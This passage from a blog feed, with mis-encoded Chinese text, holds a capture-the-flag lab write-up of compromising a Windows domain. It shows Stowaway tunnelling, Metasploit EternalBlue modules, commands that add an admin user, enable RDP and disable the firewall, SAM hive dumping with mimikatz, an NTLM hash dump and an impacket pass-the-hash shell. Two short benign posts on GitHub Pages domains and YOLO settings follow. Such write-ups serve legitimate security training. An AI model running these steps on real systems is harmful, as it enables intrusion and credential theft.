class="hljs-symbol">https:</span>/<span class="hljs-regexp">/github.com/vulhub</span><span class="hljs-regexp">/vulhub/tree</span><span class="hljs-regexp">/master/thinkphp</span><span class="hljs-regexp">/5.0.23-rce], vulnerability_type=poc-yaml-thinkphp5023-method-rce</span><br></code></pre></td></tr></table></figure><p>å‘ç°å­˜åœ¨åŸŸç¯å¢ƒ<code>192.168.20.30</code>æ˜¯åŸŸæ§æœåŠ¡å™¨ï¼Œè€Œä¸”ç”¨æ°¸æ’ä¹‹è“æ¼æ´ï¼Œæˆ‘ä»¬åªè¦æ‹¿ä¸‹åŸŸæ§ï¼Œé‚£ä¹ˆå¦ä¸€å°æœºå™¨å°±å¯ä»¥ç›´æ¥å“ˆå¸Œä¼ é€’å·¥å…·æ‹¿ä¸‹<code>192.168.20.20</code>,å°±æ˜¯æ—¥ç©¿å†…ç½‘äº†ğŸ‘Œ</p><p>ä¸Šä¼ <code>Stowaway</code></p><p>åœ¨kaliå¯åŠ¨adminç«¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./linux_x64_admin.exe -l 8000 -s 123<br></code></pre></td></tr></table></figure><p>åœ¨jiaosuè¿è¡Œ</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">windows_x64_agent</span>.exe -c <span class="hljs-number">192.168.1.105:8000</span> -s <span class="hljs-number">123</span> <br></code></pre></td></tr></table></figure><p>åŠ å…¥èŠ‚ç‚¹ï¼Œåœ¨è¿è¡Œ</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">use</span> <span class="hljs-number">0</span>(ä½¿ç”¨jiaosuèŠ‚ç‚¹)<br><span class="hljs-attribute">listen</span><br><span class="hljs-attribute">1</span><br><span class="hljs-attribute">7777</span><br></code></pre></td></tr></table></figure><p>ç›‘å¬jiaosuçš„7777ç«¯å£</p><p>åœ¨é¶æœºä¸Šè¿è¡Œ</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">windows_x64_agent</span>.exe -c <span class="hljs-number">172.16.233.2:7777</span> -s <span class="hljs-number">123</span> <br></code></pre></td></tr></table></figure><p>åŠ ä¸ŠèŠ‚ç‚¹ï¼Œåœ¨è¿è¡Œ</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">use</span> <span class="hljs-number">1</span>(ä½¿ç”¨é¶æœº)<br><span class="hljs-attribute">socks</span> <span class="hljs-number">7776</span><br></code></pre></td></tr></table></figure><p>æ­å»º socketéš§é“ï¼Œåœ¨kaliè¿è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> vim /etc/proxychains.conf<br></code></pre></td></tr></table></figure><p>æŠŠä»£ç†æ”¹æˆ <code>socks5 127.0.0.1 7776</code></p><p>å¼€æ‰“<code>msf17_010</code></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">proxychains msfconsole</span><br></code></pre></td></tr></table></figure><p>ç„¶å</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams">search ms17_010<br>use exploit/windows/smb/ms17_010_eternalblue<br><span class="hljs-keyword">set</span> rhosts <span class="hljs-comment">192.168.20.30</span><br>show <span class="hljs-comment">payloads</span><br>exploit<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæ¨¡å—ä¸è¡Œ</p><p>æ¢ä¸€ä¸ª</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">use auxiliary/admin/smb/ms17_010_command<br><span class="hljs-built_in">set</span> rhost 192.168.20.30<br><span class="hljs-built_in">set</span> <span class="hljs-built_in">command</span> <span class="hljs-built_in">type</span> C:\\flag.txt<br>run<br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330210000076.png" alt="image-20250330210000076"></p><p>æ‹¿åˆ°flag3ä½†æ˜¯æ²¡æœ‰åŸŸæ§çš„shell</p><p>å¾ˆéš¾å—</p><p>ä½†æ˜¯20é‚£å°æœºå™¨æ²¡æœ‰æ¼æ´ï¼Œå°±åªèƒ½é€šè¿‡åŸŸæ§æ‰“ï¼Œæƒ³åŠæ³•ä¸Šçº¿</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">set</span> <span class="hljs-keyword">command</span> net user hack @Abc123 <span class="hljs-string">/add</span>  <span class="hljs-comment">#åˆ›å»ºæ–°ç”¨æˆ·</span><br><span class="hljs-keyword">set</span> <span class="hljs-keyword">command</span> net localgroup administrators hack <span class="hljs-string">/add</span>  <span class="hljs-comment">#åŠ å…¥ç®¡ç†ç»„</span><br><span class="hljs-keyword">set</span> COMMAND &#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server <span class="hljs-string">/v</span> fDenyTSConnections <span class="hljs-string">/t</span> REG_DWORD <span class="hljs-string">/d</span> 00000000 <span class="hljs-string">/f</span>&#x27; <span class="hljs-comment">#æ‰“å¼€è¿œç¨‹æ¡Œé¢</span><br><span class="hljs-keyword">set</span> <span class="hljs-keyword">command</span> netsh firewall <span class="hljs-keyword">set</span> opmode disable  <span class="hljs-comment">#å…³é—­é˜²ç«å¢™</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨msfæ‰§è¡Œå‘½ä»¤</p><p>ç”¨rdpç™»å½•åŸŸæ§æœºå™¨ ps:ç™»å½•åŸŸæ§æœºéœ€åœ¨ç”¨æˆ·åå‰åŠ <code>.\</code></p><p>æŠ“å–hash</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">reg save HKLM\sam <span class="hljs-name">C</span>:\Users\hack01\Desktop\sam.hive<br>reg save HKLM\system <span class="hljs-name">C</span>:\Users\hack01\Desktop\system.hive<br>reg save HKLM\security <span class="hljs-name">C</span>:\Users\hack01\Desktop\security.hive<br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250330235956036.png" alt="image-20250330235956036"></p><p>ä¸Šä¼ <code>mimikatz</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">privilege::<span class="hljs-keyword">debug</span><br>lsadump::sam /sam:sam.hive /<span class="hljs-keyword">system</span>:<span class="hljs-keyword">system</span>.hive /<span class="hljs-keyword">security</span>:<span class="hljs-keyword">security</span>.hive<br></code></pre></td></tr></table></figure><p>æ‰¾åˆ°äº†ä½†æ˜¯æ˜¯å‡çš„ğŸ˜</p><p>ä¸Šä¼ csæ­£å‘é©¬ï¼Œç›®æ ‡ä¸»æœºä¸å‡ºç½‘ğŸ¤¡</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250331091159567.png" alt="image-20250331091159567"></p><p>éš¾æ</p><p>ä½¿ç”¨jiaosuå½“è·³æ¿ï¼Œä¸Šä¼ æ­£å‘ï¼Œæœ¨é©¬åˆ°<code>192.168.10.10</code>åœ¨æå–hashï¼Œå°è¯•hashä¼ é€’</p><p>å…ˆä¸Šçº¿jiaosuï¼Œç›´æ¥ä¼ é©¬</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250331093101546.png" alt="image-20250331093101546"></p><p>åœ¨å»ºç«‹ä¸ªæ­£å‘ç›‘å¬å™¨ï¼Œåˆ©ç”¨ç›‘å¬ç”Ÿæˆæ­£å‘æœ¨é©¬</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250331093236516.png" alt="image-20250331093236516"></p><p>ä¸Šä¼ åˆ°10çš„é¶æœºå†è¿è¡Œ</p><p>å†csè®©jiaosuç›‘å¬<code>connect 192.168.10.10</code></p><p>ä¸€ä¼š10æœºå™¨ä¸Šçº¿æˆåŠŸ</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250331093336037.png" alt="image-20250331093336037"></p><p>ä¸Šä¼ æ­£å‘é©¬åˆ°20.30é‚£å°æœºå™¨ï¼Œåœ¨20.10ç›‘å¬ç«¯å£å°è¯•ä¸Šçº¿åŸŸæ§</p><p>åœ¨20.30æœºå™¨ä¸Šç®¡ç†å‘˜è¿è¡Œæœ¨é©¬</p><p>æˆåŠŸä¸Šçº¿</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250403102526421.png" alt="image-20250403102526421"></p><p>hashdumpä¸€ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">Administrator:500:aad3b435b51404eeaad3b435b51404ee:94bd5248e87cb7f2f9b871d40c903927:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5bc02b7670084dd30471730cc0a1672c:::<br>cyberweb:1105:aad3b435b51404eeaad3b435b51404ee:2de5cd0f15d1c070851d1044e1d95c90:::<br>hack:1106:aad3b435b51404eeaad3b435b51404ee:198ab7e5f71d046b8da029ecf671db65:::<br>WIN-7NRTJO59O7N$:1000:aad3b435b51404eeaad3b435b51404ee:85a7f3800784ce0c8c3c43d150f1520f:::<br>CYBERWEB$:1103:aad3b435b51404eeaad3b435b51404ee:d222ce20e7e69c6ded4a7e96abd5ee1f:::<br></code></pre></td></tr></table></figure><p>åœ¨<code>systeminfo</code>ä¸€æ³¢</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">ä¸»æœºå:           WIN-7NRTJO59O7N<br>OS åç§°:          Microsoft Windows Server 2008 R2 Standard <br>OS ç‰ˆæœ¬:          6.1.7600 æš‚ç¼º Build 7600<br>OS åˆ¶é€ å•†:        Microsoft Corporation<br>OS é…ç½®:          ä¸»åŸŸæ§åˆ¶å™¨<br>OS æ„ä»¶ç±»å‹:      Multiprocessor Free<br>æ³¨å†Œçš„æ‰€æœ‰äºº:     Windows ç”¨æˆ·<br>æ³¨å†Œçš„ç»„ç»‡:       <br>äº§å“ ID:          00477-179-0000007-84929<br>åˆå§‹å®‰è£…æ—¥æœŸ:     2024/12/22, 11:27:06<br>ç³»ç»Ÿå¯åŠ¨æ—¶é—´:     2025/4/3, 1:04:27<br>ç³»ç»Ÿåˆ¶é€ å•†:       Red Hat<br>ç³»ç»Ÿå‹å·:         KVM<br>ç³»ç»Ÿç±»å‹:         x64-based PC<br>å¤„ç†å™¨:           å®‰è£…äº† 1 ä¸ªå¤„ç†å™¨ã€‚<br>                  [01]: Intel64 Family 6 Model 85 Stepping 4 GenuineIntel ~2000 Mhz<br>BIOS ç‰ˆæœ¬:        SeaBIOS 1.16.3-2.el9, 2014/4/1<br>Windows ç›®å½•:     C:\Windows<br>ç³»ç»Ÿç›®å½•:         C:\Windows\system32<br>å¯åŠ¨è®¾å¤‡:         \Device\HarddiskVolume1<br>ç³»ç»ŸåŒºåŸŸè®¾ç½®:     zh-cn;ä¸­æ–‡(ä¸­å›½)<br>è¾“å…¥æ³•åŒºåŸŸè®¾ç½®:   zh-cn;ä¸­æ–‡(ä¸­å›½)<br>æ—¶åŒº:             (UTC+08:00)åŒ—äº¬ï¼Œé‡åº†ï¼Œé¦™æ¸¯ç‰¹åˆ«è¡Œæ”¿åŒºï¼Œä¹Œé²æœ¨é½<br>ç‰©ç†å†…å­˜æ€»é‡:     1,023 MB<br>å¯ç”¨çš„ç‰©ç†å†…å­˜:   448 MB<br>è™šæ‹Ÿå†…å­˜: æœ€å¤§å€¼: 2,047 MB<br>è™šæ‹Ÿå†…å­˜: å¯ç”¨:   1,408 MB<br>è™šæ‹Ÿå†…å­˜: ä½¿ç”¨ä¸­: 639 MB<br>é¡µé¢æ–‡ä»¶ä½ç½®:     C:\pagefile.sys<br>åŸŸ:               cyberstrikelab.com<br>ç™»å½•æœåŠ¡å™¨:       \\WIN-7NRTJO59O7N<br>ä¿®è¡¥ç¨‹åº:         æš‚ç¼º<br>ç½‘å¡:             å®‰è£…äº† 1 ä¸ª NICã€‚<br>                  [01]: Realtek RTL8139C+ Fast Ethernet NIC<br>                      è¿æ¥å:      æœ¬åœ°è¿æ¥ 3<br>                      å¯ç”¨ DHCP:   å¦<br>                      IP åœ°å€<br>                        [01]: 192.168.20.30<br>                        [02]: fe80::f852:ed6d:f557:af3f<br><br></code></pre></td></tr></table></figure><p>ç›´æ¥å“ˆå¸Œä¼ é€’æ”»å‡»:</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs smali">impacket-0.12.0\examples&gt; python psexec.py -hashes<span class="hljs-keyword"> :94bd5248e87cb7f2f9b871d40c903927</span> cyberstrikelab.com/administrator@192.168.20.20<br>Impacket v0.12.0 - Copyright Fortra, LLC<span class="hljs-built_in"> and </span>its affiliated companies<br><br>[*] Requesting shares on 192.168.20.20.....<br>[*] Found writable share ADMIN$<br>[*] Uploading file bxPkKhSM.exe<br>[*] Opening SVCManager on 192.168.20.20.....<br>[*] Creating service KEHT on 192.168.20.20.....<br>[*] Starting service KEHT.....<br>[!] Press help for extra shell commands<br>[-] Decoding error detected, consider running chcp.com at the target,<br>map the result with https://docs.python.org/3/library/codecs.html<span class="hljs-comment">#standard-encodings</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">and </span>then<span class="hljs-built_in"> execute </span>smbexec.py again with -codec<span class="hljs-built_in"> and </span>the corresponding codec<br>Microsoft Windows [ï¿½æ±¾ 6.3.9600]<br><br>[-] Decoding error detected, consider running chcp.com at the target,<br>map the result with https://docs.python.org/3/library/codecs.html<span class="hljs-comment">#standard-encodings</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">and </span>then<span class="hljs-built_in"> execute </span>smbexec.py again with -codec<span class="hljs-built_in"> and </span>the corresponding codec<br>(c) 2013 Microsoft Corporationï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½È¨ï¿½ï¿½ï¿½ï¿½<br><br><br>C:\Windows\system32&gt; cd /<br><br>C:\&gt; dir<br>[-] Decoding error detected, consider running chcp.com at the target,<br>map the result with https://docs.python.org/3/library/codecs.html<span class="hljs-comment">#standard-encodings</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">and </span>then<span class="hljs-built_in"> execute </span>smbexec.py again with -codec<span class="hljs-built_in"> and </span>the corresponding codec<br> ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ C ï¿½ĞµÄ¾ï¿½Ã»ï¿½Ğ±ï¿½Ç©ï¿½ï¿½<br><br>[-] Decoding error detected, consider running chcp.com at the target,<br>map the result with https://docs.python.org/3/library/codecs.html<span class="hljs-comment">#standard-encodings</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">and </span>then<span class="hljs-built_in"> execute </span>smbexec.py again with -codec<span class="hljs-built_in"> and </span>the corresponding codec<br> ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ğºï¿½ï¿½ï¿½ EA78-322E<br><br><br>[-] Decoding error detected, consider running chcp.com at the target,<br>map the result with https://docs.python.org/3/library/codecs.html<span class="hljs-comment">#standard-encodings</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">and </span>then<span class="hljs-built_in"> execute </span>smbexec.py again with -codec<span class="hljs-built_in"> and </span>the corresponding codec<br> C:\ ï¿½ï¿½Ä¿Â¼<br><br><br>2025/01/15  19:47                25 flag.txt<br>2013/08/22  23:52    &lt;DIR&gt;          PerfLogs<br>2013/08/22  22:50    &lt;DIR&gt;          Program Files<br>2013/08/22  23:39    &lt;DIR&gt;          Program Files (x86)<br>2025/01/14  16:37    &lt;DIR&gt;          Users<br>2025/04/03  02:51    &lt;DIR&gt;          Windows<br>[-] Decoding error detected, consider running chcp.com at the target,<br>map the result with https://docs.python.org/3/library/codecs.html<span class="hljs-comment">#standard-encodings</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">and </span>then<span class="hljs-built_in"> execute </span>smbexec.py again with -codec<span class="hljs-built_in"> and </span>the corresponding codec<br>               1 ï¿½ï¿½ï¿½Ä¼ï¿½             25 ï¿½Ö½ï¿½<br><br>[-] Decoding error detected, consider running chcp.com at the target,<br>map the result with https://docs.python.org/3/library/codecs.html<span class="hljs-comment">#standard-encodings</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">and </span>then<span class="hljs-built_in"> execute </span>smbexec.py again with -codec<span class="hljs-built_in"> and </span>the corresponding codec<br>               5 ï¿½ï¿½Ä¿Â¼  6,237,618,176 ï¿½ï¿½ï¿½ï¿½ï¿½Ö½ï¿½<br><br><br>C:\&gt; type flag.txt<br>go-flag&#123;Nb8VOT8X9SbIzyDI&#125;<br>C:\&gt;<br></code></pre></td></tr></table></figure><p>æ‹¿åˆ°flag</p><p><strong>ä¸­ç­‰</strong></p>]]></content>
    
    
    <categories>
      
      <category>cyberstrikelab</category>
      
    </categories>
    
    
    <tags>
      
      <tag>é¶åœº</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åŸŸåç»‘å®šGithubPage</title>
    <link href="/2025/03/24/%E5%9F%9F%E5%90%8D%E7%BB%91%E5%AE%9AGithubPage/"/>
    <url>/2025/03/24/%E5%9F%9F%E5%90%8D%E7%BB%91%E5%AE%9AGithubPage/</url>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å½“åˆç”¨GithubPageæ­å»ºåšå®¢å°±æ˜¯å›¾æ–¹ä¾¿ï¼Œç°åœ¨çœ‹æ¥ä¹Ÿå¹¶ä¸æ€ä¹ˆæ–¹ä¾¿ğŸ˜…</p><h1 id="æ–¹æ³•"><a href="#æ–¹æ³•" class="headerlink" title="æ–¹æ³•"></a>æ–¹æ³•</h1><p>æ‰“å¼€github</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250324180021984.png" alt="image-20250324180021984"></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250324180037546.png" alt="image-20250324180037546"></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250324180049570.png" alt="image-20250324180049570"></p><p>æ·»åŠ åŸŸåï¼Œä¼šç»™ä½ ä¸€ä¸ªDNSçš„TXTçºªå½•</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250324180133730.png" alt="image-20250324180133730"></p><p>å¡«åˆ°åŸŸåæä¾›å•†å“ªé‡Œ(æ³¨æ„æ˜¯TXTçºªå½•)</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250324180545961.png" alt="image-20250324180545961"></p><p>å†æŠŠgithubæä¾›çš„ipæ·»åŠ ä¸Š</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">185.199.108.153</span><br><span class="hljs-number">185.199.109.153</span><br><span class="hljs-number">185.199.110.153</span><br><span class="hljs-number">185.199.111.153</span><br></code></pre></td></tr></table></figure><p>è¯¦è§ <a href="https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site/managing-a-custom-domain-for-your-github-pages-site#configuring-an-apex-domain">Github å®˜æ–¹æ–‡æ¡£</a></p><p>æ·»åŠ åŸŸåæˆ–è€…å­åŸŸåçš„CNAME</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250324180754964.png" alt="image-20250324180754964"></p><p>å†åˆ°ä»“åº“é‡Œæ·»åŠ åŸŸåè§£æ</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250324180922569.png" alt="image-20250324180922569"></p><p>å°±OKäº†ğŸ˜ğŸ˜</p>]]></content>
    
    
    
    <tags>
      
      <tag>åŸŸåç»‘å®šGithubPage</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>YOLOå­¦ä¹ </title>
    <link href="/2025/03/23/YOLO%E5%AD%A6%E4%B9%A0/"/>
    <url>/2025/03/23/YOLO%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä»Šå¤©å¤§æ¯”èµ›é‡åˆ°ä¸€ä¸ªYOLOæ¨¡å‹çš„é¢˜ç›®ï¼Œå½“æ—¶æ²¡ç¯å¢ƒï¼Œä¸ä¼šå†™ğŸ˜åé¢å»çœ‹äº†ä¸€ä¸‹YOLOå‘ç°éå¸¸æœ‰æ„æ€ï¼Œå°±æƒ³å­¦ä¸€ä¸‹</p><p>å®‰è£…<code>conda</code>åŒ…ç®¡ç†å™¨</p><p>å®‰è£…<code>pytorch</code> ä½¿ç”¨<code>nvadia -smi</code>æŸ¥çœ‹cudaçš„ç‰ˆæœ¬æ§åˆ¶</p><h1 id="set"><a href="#set" class="headerlink" title="set"></a>set</h1><p>YOLOæ¨¡å‹çš„è®¾ç½®</p><table><thead><tr><th align="left">åå­—</th><th align="left">ç¤ºä¾‹å€¼</th><th align="left">æ•°æ®ç±»å‹</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="left"><code>settings_version</code></td><td align="left"><code>&#39;0.0.4&#39;</code></td><td align="left"><code>str</code></td><td align="center">Ultralytics <em>è®¾ç½®</em>ç‰ˆæœ¬ï¼ˆä¸åŒäº Ultralytics <a href="https://pypi.org/project/ultralytics/">pip</a> ç‰ˆæœ¬ï¼‰</td></tr><tr><td align="left"><code>datasets_dir</code></td><td align="left"><code>&#39;/path/to/datasets&#39;</code></td><td align="left"><code>str</code></td><td align="center">æ•°æ®é›†çš„å­˜å‚¨ç›®å½•</td></tr><tr><td align="left"><code>weights_dir</code></td><td align="left"><code>&#39;/path/to/weights&#39;</code></td><td align="left"><code>str</code></td><td align="center">å­˜å‚¨æ¨¡å‹æƒé‡çš„ç›®å½•</td></tr><tr><td align="left"><code>runs_dir</code></td><td align="left"><code>&#39;/path/to/runs&#39;</code></td><td align="left"><code>str</code></td><td align="center">å­˜å‚¨è¯•éªŒè¿è¡Œçš„ç›®å½•</td></tr><tr><td align="left"><code>uuid</code></td><td align="left"><code>&#39;a1b2c3d4&#39;</code></td><td align="left"><code>str</code></td><td align="center">å½“å‰è®¾ç½®çš„å”¯ä¸€æ ‡è¯†ç¬¦</td></tr><tr><td align="left"><code>åŒæ­¥</code></td><td align="left"><code>çœŸ</code></td><td align="left"><code>å¸ƒå°”</code></td><td align="center">å°†åˆ†æå’Œå´©æºƒåŒæ­¥åˆ° <a href="https://hub.ultralytics.com/">Ultralytics HUB</a> çš„é€‰é¡¹</td></tr><tr><td align="left"><code>api_key</code></td><td align="left"><code>&#39;&#39;</code></td><td align="left"><code>str</code></td><td align="center"><a href="https://hub.ultralytics.com/">Ultralytics ä¸­å¿ƒ </a>API å¯†é’¥</td></tr><tr><td align="left"><code>é€æ˜ ML</code></td><td align="left"><code>çœŸ</code></td><td align="left"><code>å¸ƒå°”</code></td><td align="center">ä½¿ç”¨ <a href="https://docs.ultralytics.com/integrations/clearml/">ClearML</a> æ—¥å¿—è®°å½•çš„é€‰é¡¹</td></tr><tr><td align="left"><code>å½—æ˜Ÿ</code></td><td align="left"><code>çœŸ</code></td><td align="left"><code>å¸ƒå°”</code></td><td align="center">å¯é€‰æ‹©ä½¿ç”¨ <a href="https://bit.ly/yolov8-readme-comet">Comet ML</a> è¿›è¡Œå®éªŒè·Ÿè¸ªå’Œå¯è§†åŒ–</td></tr><tr><td align="left"><code>DVC ï¼ˆè§†é¢‘å½•åƒ</code>æœºï¼‰</td><td align="left"><code>çœŸ</code></td><td align="left"><code>å¸ƒå°”</code></td><td align="center">å¯é€‰æ‹©ä½¿ç”¨ <a href="https://dvc.org/doc/dvclive/ml-frameworks/yolo">DVC è¿›è¡Œå®éªŒè·Ÿè¸ª</a>å’Œç‰ˆæœ¬æ§åˆ¶</td></tr><tr><td align="left"><code>æ¢çº½</code></td><td align="left"><code>çœŸ</code></td><td align="left"><code>å¸ƒå°”</code></td><td align="center">ä½¿ç”¨ <a href="https://hub.ultralytics.com/">Ultralytics HUB</a> é›†æˆçš„é€‰é¡¹</td></tr><tr><td align="left"><code>mlflow</code></td><td align="left"><code>çœŸ</code></td><td align="left"><code>å¸ƒå°”</code></td><td align="center">å¯é€‰æ‹©ä½¿ç”¨ <a href="https://docs.ultralytics.com/integrations/mlflow/">MLFlow</a> è¿›è¡Œå®éªŒè·Ÿè¸ª</td></tr><tr><td align="left"><code>æµ·ç‹æ˜Ÿ</code></td><td align="left"><code>çœŸ</code></td><td align="left"><code>å¸ƒå°”</code></td><td align="center">ä½¿ç”¨ <a href="https://neptune.ai/">Neptune</a> è¿›è¡Œå®éªŒè·Ÿè¸ªçš„é€‰é¡¹</td></tr><tr><td align="left"><code>Raytune é›· tune</code></td><td align="left"><code>çœŸ</code></td><td align="left"><code>å¸ƒå°”</code></td><td align="center">ä½¿ç”¨ <a href="https://docs.ultralytics.com/integrations/ray-tune/">Ray Tune</a> è¿›è¡Œ<a href="https://www.ultralytics.com/glossary/hyperparameter-tuning">è¶…å‚æ•°ä¼˜åŒ–çš„</a>é€‰é¡¹</td></tr><tr><td align="left"><code>TensorBoard æ¿</code></td><td align="left"><code>çœŸ</code></td><td align="left"><code>å¸ƒå°”</code></td><td align="center">ä½¿ç”¨ <a href="https://docs.ultralytics.com/integrations/tensorboard/">TensorBoard</a> è¿›è¡Œå¯è§†åŒ–çš„é€‰é¡¹</td></tr><tr><td align="left"><code>å¢™</code></td><td align="left"><code>çœŸ</code></td><td align="left"><code>å¸ƒå°”</code></td><td align="center">ä½¿ç”¨<a href="https://docs.ultralytics.com/integrations/weights-biases/">æƒé‡å’Œåå·®</a>è®°å½•çš„é€‰é¡¹</td></tr><tr><td align="left"><code>vscode_msg</code></td><td align="left"><code>çœŸ</code></td><td align="left"><code>å¸ƒå°”</code></td><td align="center">æ£€æµ‹åˆ° VS Code 